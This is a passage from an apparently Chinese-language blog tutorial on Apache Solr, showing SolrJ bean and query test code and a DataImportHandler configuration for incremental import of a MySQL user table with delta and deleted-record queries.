org.apache.solr.client.solrj.beans.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class User {</span><br><span class=\"line\"></span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private int id;</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private String userName;</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private int userAge;</span><br><span class=\"line\">    </span><br><span class=\"line\">    @Field</span><br><span class=\"line\">    private String userAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    public int <span class=\"function\"><span class=\"title\">getId</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> id;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>Id(int id) {</span><br><span class=\"line\">        this.id = id;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public String <span class=\"function\"><span class=\"title\">getUserName</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> userName;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>UserName(String userName) {</span><br><span class=\"line\">        this.userName = userName;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public int <span class=\"function\"><span class=\"title\">getUserAge</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> userAge;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>UserAge(int userAge) {</span><br><span class=\"line\">        this.userAge = userAge;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public String <span class=\"function\"><span class=\"title\">getUserAddress</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> userAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    public void <span class=\"built_in\">set</span>UserAddress(String userAddress) {</span><br><span class=\"line\">        this.userAddress = userAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public String <span class=\"function\"><span class=\"title\">toString</span></span>() {</span><br><span class=\"line\">        <span class=\"built_in\">return</span> this.userName + <span class=\"string\">&quot; &quot;</span> + this.userAge + <span class=\"string\">&quot; &quot;</span> + this.userAddress;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x4F7F;&#x7528;@Field&#x6CE8;&#x89E3;&#x7684;&#x5C5E;&#x6027;&#x8981;&#x548C;Solr&#x914D;&#x7F6E;&#x7684;Field&#x5BF9;&#x5E94;&#x3002;</p>\n<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.solr.test;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.apache.solr.client.solrj.SolrQuery;</span><br><span class=\"line\">import org.apache.solr.client.solrj.SolrServer;</span><br><span class=\"line\">import org.apache.solr.client.solrj.SolrServerException;</span><br><span class=\"line\">import org.apache.solr.client.solrj.impl.HttpSolrServer;</span><br><span class=\"line\">import org.apache.solr.client.solrj.response.QueryResponse;</span><br><span class=\"line\">import org.apache.solr.client.solrj.response.UpdateResponse;</span><br><span class=\"line\">import org.apache.solr.common.SolrDocumentList;</span><br><span class=\"line\"></span><br><span class=\"line\">import com.mybatis.test.model.User;</span><br><span class=\"line\"></span><br><span class=\"line\">public class SolrTest {</span><br><span class=\"line\">    </span><br><span class=\"line\">    private static SolrServer server;</span><br><span class=\"line\">    </span><br><span class=\"line\">    private static final String DEFAULT_URL = <span class=\"string\">&quot;http://localhost:8983/solr/collection1&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    public static void <span class=\"function\"><span class=\"title\">init</span></span>() {</span><br><span class=\"line\">        server = new HttpSolrServer(DEFAULT_URL);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public static void indexUser(User user){</span><br><span class=\"line\">        try {</span><br><span class=\"line\">            //&#x6DFB;&#x52A0;user bean&#x5230;&#x7D22;&#x5F15;&#x5E93;</span><br><span class=\"line\">            try {</span><br><span class=\"line\">                UpdateResponse response = server.addBean(user);</span><br><span class=\"line\">                server.commit();</span><br><span class=\"line\">                System.out.println(response.getStatus());</span><br><span class=\"line\">            } catch (IOException e) {</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            }</span><br><span class=\"line\">        } catch (SolrServerException e) {</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        } </span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    //&#x6D4B;&#x8BD5;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7684;bean&#x5B9E;&#x4F8B;&#x5230;&#x7D22;&#x5F15;</span><br><span class=\"line\">    public static void <span class=\"function\"><span class=\"title\">testIndexUser</span></span>(){</span><br><span class=\"line\">        User user = new User();</span><br><span class=\"line\">        user.setId(8);</span><br><span class=\"line\">        user.setUserAddress(<span class=\"string\">&quot;place&quot;</span>);</span><br><span class=\"line\">        user.setUserName(<span class=\"string\">&quot;cdebcdccga&quot;</span>);</span><br><span class=\"line\">        user.setUserAge(83);</span><br><span class=\"line\">        </span><br><span class=\"line\">        indexUser(user);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    </span><br><span class=\"line\">    public static void <span class=\"function\"><span class=\"title\">testQueryAll</span></span>() {</span><br><span class=\"line\">        SolrQuery params = new SolrQuery();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // &#x67E5;&#x8BE2;&#x5173;&#x952E;&#x8BCD;&#xFF0C;*:*&#x4EE3;&#x8868;&#x6240;&#x6709;&#x5C5E;&#x6027;&#x3001;&#x6240;&#x6709;&#x503C;&#xFF0C;&#x5373;&#x6240;&#x6709;index</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;q&quot;</span>, <span class=\"string\">&quot;*:*&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // &#x5206;&#x9875;&#xFF0C;start=0&#x5C31;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#xFF0C;rows=5&#x5F53;&#x524D;&#x8FD4;&#x56DE;5&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x9875;&#x5C31;&#x662F;&#x53D8;&#x5316;start&#x8FD9;&#x4E2A;&#x503C;&#x4E3A;5&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;start&quot;</span>, 0);</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;rows&quot;</span>, Integer.MAX_VALUE);</span><br><span class=\"line\">            </span><br><span class=\"line\">        // &#x6392;&#x5E8F;&#xFF0C;&#x5982;&#x679C;&#x6309;&#x7167;id&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;score desc &#x6539;&#x6210; id desc(or asc)</span><br><span class=\"line\">        // params.set(<span class=\"string\">&quot;sort&quot;</span>, <span class=\"string\">&quot;score desc&quot;</span>);</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;sort&quot;</span>, <span class=\"string\">&quot;id asc&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // &#x8FD4;&#x56DE;&#x4FE1;&#x606F;*&#x4E3A;&#x5168;&#x90E8;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5168;&#x90E8;&#x52A0;&#x4E0A;score&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x52A0;&#x4E0B;&#x9762;&#x5C31;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;score</span><br><span class=\"line\">        params.set(<span class=\"string\">&quot;fl&quot;</span>, <span class=\"string\">&quot;*,score&quot;</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        QueryResponse response = null;</span><br><span class=\"line\">        try {</span><br><span class=\"line\">            response = server.query(params);</span><br><span class=\"line\">        } catch (SolrServerException e) {</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        }</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(response!=null){</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Search Results: &quot;</span>);</span><br><span class=\"line\">            SolrDocumentList list = response.getResults();</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (int i = 0; i &lt; list.size(); i++) {</span><br><span class=\"line\">                System.out.println(list.get(i));</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">     </span><br><span class=\"line\">    public static void main(String[] args) {</span><br><span class=\"line\">        init();</span><br><span class=\"line\">        //<span class=\"built_in\">test</span>IndexUser();</span><br><span class=\"line\">        <span class=\"built_in\">test</span>QueryAll();</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x5982;&#x679C;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x662F;Solr&#x7D22;&#x5F15;&#x4E2D;&#x6CA1;&#x6709;index&#x8FD9;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x67E5;&#x4E0D;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x5728;&#x4F7F;&#x7528;Solr&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x65F6;&#xFF0C;&#x90FD;&#x662F;&#x5148;&#x63D2;&#x5165;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x518D;&#x5728;Solr&#x4E2D;index&#x8FD9;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;Solr&#x7684;&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;&#x6216;&#x662F;&#x5206;&#x8BCD;&#x529F;&#x80FD;&#x6765;&#x68C0;&#x7D22;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7684;&#x5185;&#x5BB9;&#x3002;</p>\n<h3 id=\"DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;\"><a href=\"#DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;\" class=\"headerlink\" title=\"DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;\"></a>DIH&#x589E;&#x91CF;&#x4ECE;MYSQL&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;</h3><p>&#x5DF2;&#x7ECF;&#x5B66;&#x4F1A;&#x4E86;&#x5982;&#x4F55;&#x5168;&#x91CF;&#x5BFC;&#x5165;MySQL&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5168;&#x91CF;&#x5BFC;&#x5165;&#x5728;&#x6570;&#x636E;&#x91CF;&#x5927;&#x7684;&#x65F6;&#x5019;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x90FD;&#x4F1A;&#x9002;&#x7528;&#x589E;&#x91CF;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5BFC;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#x5982;&#x4F55;&#x589E;&#x91CF;&#x5BFC;&#x5165;MYSQL&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x8BBE;&#x7F6E;&#x5B9A;&#x65F6;&#x6765;&#x505A;&#x3002;</p>\n<p>1&#xFF09;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7684;&#x66F4;&#x6539;</p>\n<p>&#x524D;&#x9762;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#x597D;&#x4E86;&#x4E00;&#x4E2A;User&#x7684;&#x8868;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF0C;&#x9700;&#x8981;&#x65B0;&#x589E;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;updateTime&#xFF0C;&#x7C7B;&#x578B;&#x4E3A;timestamp&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;CURRENT_TIMESTAMP&#x3002;</p>\n<p>&#x6709;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;Solr&#x624D;&#x80FD;&#x5224;&#x65AD;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x54EA;&#x4E9B;&#x6570;&#x636E;&#x662F;&#x65B0;&#x7684;&#x3002;</p>\n<p>&#x56E0;&#x4E3A;Solr&#x672C;&#x8EAB;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x503C;last_index_time&#xFF0C;&#x8BB0;&#x5F55;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x505A;full import&#x6216;&#x8005;&#x662F;delta import(&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF09;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5B58;&#x50A8;&#x5728;&#x6587;&#x4EF6;conf&#x76EE;&#x5F55;&#x7684;dataimport.properties&#x6587;&#x4EF6;&#x4E2D;&#x3002;</p>\n<p>2&#xFF09;data-config.xml&#x4E2D;&#x5FC5;&#x8981;&#x5C5E;&#x6027;&#x7684;&#x8BBE;&#x7F6E;</p>\n<p>transformer &#x683C;&#x5F0F;&#x8F6C;&#x5316;&#xFF1A;HTMLStripTransformer &#x7D22;&#x5F15;&#x4E2D;&#x5FFD;&#x7565;HTML&#x6807;&#x7B7E;<br>query&#xFF1A;&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;&#x8868;&#x7B26;&#x5408;&#x8BB0;&#x5F55;&#x6570;&#x636E;<br>deltaQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x67E5;&#x8BE2;&#x4E3B;&#x952E;ID  &#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;ID&#x5B57;&#x6BB5;<br>deltaImportQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x67E5;&#x8BE2;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;<br>deletedPkQuery&#xFF1A;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x5220;&#x9664;&#x4E3B;&#x952E;ID&#x67E5;&#x8BE2; &#x6CE8;&#x610F;&#x8FD9;&#x4E2A;&#x53EA;&#x80FD;&#x8FD4;&#x56DE;ID&#x5B57;&#x6BB5;   </p>\n<p>&#x6709;&#x5173;&#x201C;query&#x201D;&#xFF0C;&#x201C;deltaImportQuery&#x201D;&#xFF0C; &#x201C;deltaQuery&#x201D;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x5F15;&#x7528;&#x5B98;&#x7F51;&#x8BF4;&#x660E;&#xFF0C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br>The query gives the data needed to populate fields of the Solr document in full-import<br>The deltaImportQuery gives the data needed to populate fields when running a delta-import<br>The deltaQuery gives the primary keys of the current entity which have changes since the last index time</p>\n<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x5173;&#x8054;&#x5B50;&#x8868;&#x67E5;&#x8BE2;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x7528;&#x5230;parentDeltaQuery<br>The parentDeltaQuery uses the changed rows of the current table (fetched with deltaQuery) to give the changed rows in theparent table. This is necessary because whenever a row in the child table changes, we need to re-generate the document which has that field.</p>\n<p>&#x66F4;&#x591A;&#x8BF4;&#x660E;&#x770B;DeltaImportHandler&#x7684;&#x8BF4;&#x660E;&#x6587;&#x6863;&#x3002;</p>\n<p>&#x9488;&#x5BF9;User&#x8868;&#xFF0C;data-config.xml&#x6587;&#x4EF6;&#x7684;&#x914D;&#x7F6E;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;dataConfig&gt;</span><br><span class=\"line\">    &lt;dataSource <span class=\"built_in\">type</span>=<span class=\"string\">&quot;JdbcDataSource&quot;</span> driver=<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span> url=<span class=\"string\">&quot;jdbc:mysql://127.0.0.1:3306/mybatis&quot;</span> user=<span class=\"string\">&quot;root&quot;</span> password=<span class=\"string\">&quot;luxx&quot;</span> batchSize=<span class=\"string\">&quot;-1&quot;</span> /&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;document name=<span class=\"string\">&quot;testDoc&quot;</span>&gt;</span><br><span class=\"line\">        &lt;entity name=<span class=\"string\">&quot;user&quot;</span> pk=<span class=\"string\">&quot;id&quot;</span></span><br><span class=\"line\">                query=<span class=\"string\">&quot;select * from user&quot;</span></span><br><span class=\"line\">                deltaImportQuery=<span class=\"string\">&quot;select * from user where id=&apos;<span class=\"variable\">${dih.delta.id}</span>&apos;&quot;</span></span><br><span class=\"line\">                deltaQuery=<span class=\"string\">&quot;select id from user where updateTime&gt; &apos;<span class=\"variable\">${dataimporter.last_index_time}</span>&apos;&quot;</span>&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;         &lt;field column=<span class=\"string\">&quot;id&quot;</span> name=<span class=\"string\">&quot;id&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;        &lt;field column=<span class=\"string\">&quot;userName&quot;</span> name=<span class=\"string\">&quot;userName&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAge&quot;</span> name=<span class=\"string\">&quot;userAge&quot;</span>/&gt;</span><br><span class=\"line\">            &lt;field column=<span class=\"string\">&quot;userAddress&quot;</span> name=<span class=\"string\">&quot;userAddress&quot;</span>/&gt;</span><br><span class=\"line\">&lt;field column=<span class=\"string\">&quot;updateTime&quot;</span> name=<span class=\"string\">&quot;updateTime&quot;</span>/&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&#x3000;  &lt;/entity&gt;</span><br><span class=\"line\">&#x3000;&#x3000;&lt;/document&gt;</span><br><span class=\"line\">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure>\n<p>&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x7684;&#x539F;&#x7406;&#x662F;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x6839;&#x636E;deltaQuery&#x6307;&#x5B9A;&#x7684;SQL&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x9700;&#x8981;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x7684;&#x6570;&#x636E;&#x7684;ID&#x53F7;&#x3002;</p>\n<p>&#x7136;&#x540E;&#x6839;&#x636E;deltaImportQuery&#x6307;&#x5B9A;&#x7684;SQL&#x8BED;&#x53E5;&#x8FD4;&#x56DE;&#x6240;&#x6709;&#x8FD9;&#x4E9B;ID&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4E3A;&#x8FD9;&#x6B21;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x6240;&#x8981;&#x5904;&#x7406;&#x7684;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#xFF1A;&#x901A;&#x8FC7;&#x5185;&#x7F6E;&#x53D8;&#x91CF;&#x201C;${dih.delta.id}&#x201D;&#x548C; &#x201C;${dataimporter.last_index_time}&#x201D;&#x6765;&#x8BB0;&#x5F55;&#x672C;&#x6B21;&#x8981;&#x7D22;&#x5F15;&#x7684;id&#x548C;&#x6700;&#x8FD1;&#x4E00;&#x6B21;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>\n<p>&#x6CE8;&#x610F;&#xFF1A;&#x521A;&#x65B0;&#x52A0;&#x4E0A;&#x7684;updateTime&#x5B57;&#x6BB5;&#x4E5F;&#x8981;&#x5728;field&#x5C5E;&#x6027;&#x4E2D;&#x914D;&#x7F6E;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x8981;&#x5728;schema.xml&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;field name=<span class=\"string\">&quot;updateTime&quot;</span> <span class=\"built_in\">type</span>=<span class=\"string\">&quot;date&quot;</span> indexed=<span class=\"string\">&quot;true&quot;</span> stored=<span class=\"string\">&quot;true&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x4E1A;&#x52A1;&#x4E2D;&#x8FD8;&#x6709;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x52A0;&#x4E00;&#x4E2A;isDeleted&#x5B57;&#x6BB5;&#x6765;&#x8868;&#x660E;&#x8BE5;&#x6761;&#x6570;&#x636E;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x88AB;&#x5220;&#x9664;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;Solr&#x5728;&#x66F4;&#x65B0;index&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x6765;&#x66F4;&#x65B0;&#x54EA;&#x4E9B;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#x7684;&#x8BB0;&#x5F55;&#x7684;&#x7D22;&#x5F15;&#x3002;</p>\n<p>&#x8FD9;&#x65F6;&#x5019;&#x9700;&#x8981;&#x5728;dataConfig.xml&#x4E2D;&#x6DFB;&#x52A0;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query=<span class=\"string\">&quot;select * from user where isDeleted=0&quot;</span></span><br><span class=\"line\">deltaImportQuery=<span class=\"string\">&quot;select * from user where id=&apos;<span class=\"variable\">${dih.delta.id}</span>&apos;&quot;</span></span><br><span class=\"line\">deltaQuery=<span class=\"string\">&quot;select id from user where updateTime&gt; &apos;<span class=\"variable\">${dataimporter.last_index_time}</span>&apos; and isDeleted=0&quot;</span></span><br><span class=\"line\">deletedPkQuery=<span class=\"string\">&quot;select id from user where isDeleted=1&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x65F6;&#x5019;Solr&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;&#x4E2D;isDeleted=1&#x7684;&#x6570;&#x636E;&#x7684;&#x7D22;&#x5F15;&#x3002;</p>\n<h3 id=\"&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;\"><a href=\"#&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;\" class=\"headerlink\" title=\"&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;\"></a>&#x6D4B;&#x8BD5;&#x589E;&#x91CF;&#x5BFC;&#x5165;</h3><p>&#x5982;&#x679C;User&#x8868;&#x91CC;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x6E05;&#x7A7A;&#x4EE5;&#x524D;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#xFF08;&#x56E0;&#x4E3A;&#x52A0;&#x7684;updateTime&#x6CA1;&#x6709;&#x503C;&#xFF09;&#xFF0C;&#x7528;&#x6211;&#x7684;Mybatis&#x6D4B;&#x8BD5;&#x7A0B;&#x5E8F;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;User&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4F1A;&#x4EE5;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x8D4B;&#x503C;&#x7ED9;&#x8BE5;&#x5B57;&#x6BB5;&#x3002;&#x5728;Solr&#x4E2D;&#x4F7F;&#x7528;Query&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6CA1;&#x6709;&#x67E5;&#x8BE2;&#x5230;&#x8BE5;&#x503C;&#xFF0C;&#x4F7F;&#x7528;dataimport?command=delta-import&#x589E;&#x91CF;&#x5BFC;&#x5165;&#xFF0C;&#x518D;&#x6B21;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x5C31;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;&#x5230;&#x521A;&#x521A;&#x63D2;&#x5165;&#x5230;MySQL&#x7684;&#x503C;&#x3002;</p>\n<h3 id=\"&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;\"><a href=\"#&#x8BBE;&#x7F6E;&#x589E;&#x91CF;&#x5BFC;&#x5165;&#x4E3A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;\" class=\"headerlink\" 